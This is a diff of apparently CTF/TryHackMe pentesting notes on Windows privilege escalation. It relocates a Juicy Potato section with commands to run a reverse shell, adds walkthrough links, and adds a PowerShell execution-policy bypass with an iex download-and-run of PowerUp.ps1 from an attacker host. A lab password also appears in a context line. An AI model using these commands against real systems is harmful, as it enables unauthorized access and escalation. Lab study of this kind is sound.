@@ -460,20 +460,6 @@ Password: tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
 
 ## Privilege Escalation
 
-**Juicy Potato**
-
-* Download Juicy Potato to your attack machine
-* Upload Juicy Potato to the target (ex: via FTP, SMB, HTTP, etc.)
-* Create a reverse shell and upload it to the target (ex: via FTP, SMB, HTTP, etc.) use Juicy Potato to execute your reverse shell
-
-```
-wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
-```
-
-```
-JuicyPotato.exe -l 5050 -p C:\path\to\reverse-shell.exe -t *
-```
-
 
 
 ## **Automated Enumeration Tools**
@@ -489,11 +475,31 @@ JuicyPotato.exe -l 5050 -p C:\path\to\reverse-shell.exe -t *
 
 
 
+## **Juicy Potato**
+
+**Examples**
+
+[retro.md](../../../../walkthroughs/tryhackme/retro.md "mention")
+
+* Download Juicy Potato to your attack machine
+* Upload Juicy Potato to the target (ex: via FTP, SMB, HTTP, etc.)
+* Create a reverse shell and upload it to the target (ex: via FTP, SMB, HTTP, etc.) use Juicy Potato to execute your reverse shell
+
+```
+wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
+```
+
+```
+JuicyPotato.exe -l 5050 -p C:\path\to\reverse-shell.exe -t *
+```
+
+
+
 ## PowerUp.ps1
 
 **Examples**
 
-[#privilege-escalation](../../../../walkthroughs/tryhackme/steel-mountain.md#privilege-escalation "mention")
+[#privilege-escalation](../../../../walkthroughs/tryhackme/steel-mountain.md#privilege-escalation "mention")[retro.md](../../../../walkthroughs/tryhackme/retro.md "mention")
 
 **Setup**
 
@@ -504,7 +510,7 @@ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Prives
 python2 -m SimpleHTTPServer 81
 ```
 
-**Windows**
+**Victim(cmd)**
 
 ```
 certutil -urlcache -f http://10.10.228.214:81/PowerUp.ps1 PowerUp.ps1 
@@ -512,7 +518,13 @@ certutil -urlcache -f http://10.10.228.214:81/PowerUp.ps1 PowerUp.ps1
 Invoke-AllChecks
 ```
 
+**OR**
 
+**Victim(powershell)**
+
+<pre><code>powershell -ep bypass
+<strong>iex​(New-Object Net.WebClient).DownloadString('http://$KALI:81/PowerUp.ps1')
+</strong></code></pre>
 
 
 
